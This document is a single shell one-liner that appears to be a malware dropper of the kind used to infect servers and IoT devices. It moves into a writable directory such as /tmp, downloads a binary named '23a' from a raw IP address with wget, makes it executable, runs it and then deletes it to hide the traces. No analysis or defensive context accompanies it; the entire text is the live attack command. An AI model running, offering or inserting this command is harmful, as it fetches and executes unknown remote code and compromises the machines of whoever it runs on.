cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.47/23a; chmod +x 23a; ./23a; rm -rf 23a
